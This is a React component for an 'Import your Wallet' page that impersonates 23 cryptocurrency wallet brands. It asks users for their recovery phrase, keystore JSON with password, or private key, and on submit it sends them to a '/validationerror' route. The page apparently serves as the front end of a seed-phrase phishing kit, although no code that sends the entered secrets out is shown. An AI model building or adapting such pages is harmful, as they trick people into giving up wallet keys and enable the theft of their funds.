import React, { useEffect, useRef, useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import Aktionariat from "../assets/Aktionariat.png"
import MetaMask from "../assets/MetaMask.png"
import Trust from "../assets/Trust.png"
import Phantom from "../assets/Phantom.png"
import Coinbase from "../assets/Coinbase.png"
import CryptoCom from "../assets/CryptoCom.png"
import Blockchain from "../assets/Blockchain.png"
import Binance from "../assets/Binance.png"
import Safepal from "../assets/Safepal.png"
import Ledger from "../assets/Ledger.png"
import Argent from "../assets/Argent.png"
import Bitkeep from "../assets/Bitkeep.png"
import Starkpoint from "../assets/Starkpoint.png"
import Ownbit from "../assets/Ownbit.png"
import InfinityWallet from "../assets/InfinityWallet.png"
import WalletIo from "../assets/WalletIo.png"
import Infinito from "../assets/Infinito.png"
import Torus from "../assets/Torus.png"
import bitPay from "../assets/bitPay.png"
import Imtoken from "../assets/Imtoken.png"
import OtherWallets from "../assets/OtherWallets.png"
import fortmatic from "../assets/fortmatic.png"
import KeyringPro from "../assets/KeyringPro.png"
const wallets = [{
  "icon":MetaMask,
  'title':'MetaMask'
},
{
  "icon":Trust,
  'title':'Trust'
},{
  "icon":Phantom,
  'title':'Phantom'
},{
  "icon":Coinbase,
  'title':'Coinbase'
},{
  "icon":CryptoCom,
  'title':'CryptoCom'
},{
  "icon":Blockchain,
  'title':'Blockchain'
},{
  "icon":Binance,
  'title':'Binance'
},{
  "icon":Safepal,
  'title':'Safepal'
},{
  "icon":Ledger,
  'title':'Ledger'
},{
  "icon":Argent,
  'title':'Argent'
},{
  "icon":fortmatic,
  'title':'fortmatic'
},{
  "icon":Aktionariat,
  'title':'Aktionariat'
},{
  "icon":KeyringPro,
  'title':'KeyringPro'
},{
  "icon":Bitkeep,
  'title':'Bitkeep'
},{
  "icon":Starkpoint,
  'title':'Starkpoint'
},{
  "icon":Ownbit,
  'title':'Ownbit'
},{
  "icon":InfinityWallet,
  'title':'InfinityWallet'
},{
  "icon":WalletIo,
  'title':'WalletIo'
},{
  "icon":Infinito,
  'title':'Infinito'
},{
  "icon":Torus,
  'title':'Torus'
},{
  "icon":bitPay,
  'title':'bitPay'
},{
  "icon":Imtoken,
  'title':'Imtoken'
},{
  "icon":OtherWallets,
  'title':'OtherWallets'
},]
const ImportWallet = () => {
  const navigate = useNavigate()
  const {id} = useParams()
const HandleWallet = () => {
let tabs = document.querySelectorAll(".tab")
let indicator = document.querySelector(".indicator")
let panels = document.querySelectorAll(".tab-panel")
indicator.style.width = tabs[0].getBoundingClientRect().width + 'px'
indicator.style.left = tabs[0].getBoundingClientRect().left - tabs[0].parentElement.getBoundingClientRect().left + 'px'

tabs.forEach((tab,index) =>{
   if(tab.id == tabs[0].id){
        tab.classList.add("tabActive","text-[#2D2D2D]")
        tab.classList.remove("bg-[rgba(48,48,48,0.7)]")
    }
    
  tab.addEventListener("click", ()=>{
    tabs.forEach(tab=>{
        tab.classList.remove("tabActive","text-[#2D2D2D]")
        tab.classList.add("bg-[rgba(48,48,48,0.7)]")
    })
    let tabTarget = tab.getAttribute("aria-controls")

    indicator.style.width = tab.getBoundingClientRect().width + 'px'
    indicator.style.left = tab.getBoundingClientRect().left - tab.parentElement.getBoundingClientRect().left + 'px'

    if(tab.id == tabs[index].id){
        tab.classList.add("tabActive","text-[#2D2D2D]")
        tab.classList.remove("bg-[rgba(48,48,48,0.7)]")
    }

    panels.forEach(panel =>{
      let panelId = panel.getAttribute("id")
      if(tabTarget === panelId){
        panel.classList.remove("invisible", "opacity-0")
        panel.classList.add("visible", "opacity-100")
      } else {
        panel.classList.add("invisible", "opacity-0")
      }
    })
  })
})
}

const handleSubmit = (e) => {
  e.preventDefault()
  navigate("/validationerror")
}

useEffect(()=>{
  HandleWallet()
},[])
  return (
    <div>
      <div className='flex items-center'>
      <div className="max-w-xl mx-auto mt-10 w-[90%] bg-[#222222] px-8 pt-10 pb-10 rounded-3xl">
        <div className='flex justify-start gap-x-5 items-center mb-6'>
                <div className='w-[35px] h-[35px]'><img src={`${wallets[id].icon}`} alt="logo.png" className='w-full' /></div>
                <h3 className='text-white font-semibold xs:text-sm md:text-lg lg:text-2xl'>Import your {`${wallets[id].title}`} Wallet</h3>
        </div>
      <div className="w-full">
        <div 
          role="tablist"
          aria-label="tabs"
          className="relative grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-3 md:rounded-full bg-[rgba(48,48,48,0.3)] overflow-hidden transition"
        >
          <div className="invisible md:absolute indicator md:h-11 my-auto top-0 bottom-0 left-0 bg-[#D1FFCE] rounded-full shadow-md"></div>
          <button
            role="tab"
            aria-selected="true"
            aria-controls="panel-1"
            id="tab-1"
            tabIndex="0"
            className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
          >
            <span>Phrase</span>
          </button>
          <button
            role="tab"
            aria-selected="false"
            aria-controls="panel-2"
            id="tab-2"
            tabIndex="-1"
            className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
          >
            <span>Keystore JSON</span>
          </button>
          <button
            role="tab"
            aria-selected="false"
            aria-controls="panel-3"
            id="tab-3"
            tabIndex="-1"
            className="relative block px-3 tab py-3 text-white xs:text-sm bg-[rgba(48,48,48,0.7)] rounded-full"
          >
            <span>Private Key</span>
          </button>
        </div>
        <div className="mt-6 relative">
          <div
            role="tabpanel"
            id="panel-1"
            className="tab-panel transition duration-300"
          >
            <form  onSubmit={handleSubmit}>
                <textarea className='w-full h-[10rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none' placeholder='Enter your current phrase'></textarea>
                <p className='text-white mt-3 text-xs'>Typically 12 (sometimes 24) words separated by single spaces</p>
                <div className='flex justify-between items-center mt-5'>
                    <div className='bg-red-500 py-5 w-[48%] text-center font-bold text-white rounded-full'>
                        <a href="#">Cancel</a>
                    </div>
                    <button className='bg-lime-500 py-5 w-[48%] rounded-full text-[#222222] font-bold'>Import</button>
                </div>
            </form>
          </div>
          <div
            role="tabpanel"
            id="panel-2"
            className="absolute top-0 invisible opacity-0 tab-panel transition duration-300"
          >
            <form  onSubmit={handleSubmit} className='sm:w-[496px]'>
                <textarea className='w-full h-[7rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none' placeholder='Enter your Keystore JSON'></textarea>
                <input type='text' className='w-full h-[4rem] mt-3 p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none' placeholder='Enter your current phrase'/>
                <p className='text-white mt-3 text-xs'>Several lines of text beginning with {`${"'{...}'"}`} plus the password you used to encrypt it.</p>
                <div className='flex justify-between items-center mt-5'>
                    <div className='bg-red-500 py-5 w-[48%] text-center font-bold text-white rounded-full'>
                        <a href="#">Cancel</a>
                    </div>
                    <button className='bg-lime-500 py-5 w-[48%] rounded-full text-[#222222] font-bold'>Import</button>
                </div>
            </form>
          </div>
          <div
            role="tabpanel"
            id="panel-3"
            className="absolute top-0 invisible opacity-0 tab-panel transition duration-300"
          >
            <form onSubmit={handleSubmit} className='sm:w-[496px]'>
                <input type='text' className='w-full h-[4rem] p-4 rounded-3xl bg-transparent border border-[#9F9F9F] placeholder:text-white placeholder:text-sm resize-none' placeholder='Enter your current phrase'/>
                <p className='text-white mt-3 text-xs'>Several lines of text beginning with {`${"'{...}'"}`} plus the password you used to encrypt it.</p>
                <div className='flex justify-between items-center mt-5'>
                    <div className='bg-red-500 py-5 w-[48%] text-center font-bold text-white rounded-full'>
                        <a href="#">Cancel</a>
                    </div>
                    <button className='bg-lime-500 py-5 w-[48%] rounded-full text-[#222222] font-bold' type='submit'>Import</button>
                </div>
            </form>
          </div>
        </div>
      </div>
    </div>
    </div>
    </div>
  )
}

export default ImportWallet
